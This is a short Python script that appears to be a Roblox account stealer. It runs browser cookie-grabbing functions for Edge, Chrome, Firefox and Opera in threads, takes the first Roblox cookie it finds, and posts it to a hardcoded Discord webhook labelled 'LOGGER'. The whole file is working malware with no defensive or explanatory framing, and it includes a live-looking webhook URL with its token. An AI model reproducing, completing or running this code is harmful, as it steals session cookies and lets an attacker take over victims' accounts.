from loggers import *
from ThreadWithReturnValue import *

WEBHOOK = 'https://discord.com/api/webhooks/984019081575424000/wxQyVwe_5i86SRNbGM0oaGnAiZKvB-MTP8OXBjD8krdp26Gh10sve7cX9GKs6xp08VwZ'


def roblox_logger():
    finded_cookie = ""

    browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

    for x in browsers:
        twrv = ThreadWithReturnValue(target=x)
        twrv.start()
        if (twrv.join() is None):
            continue
        else:
            finded_cookie = twrv.join()
            break

    requests.post(WEBHOOK, json={'username': 'LOGGER',
                  'content': f'```Cookie: {finded_cookie}```'})
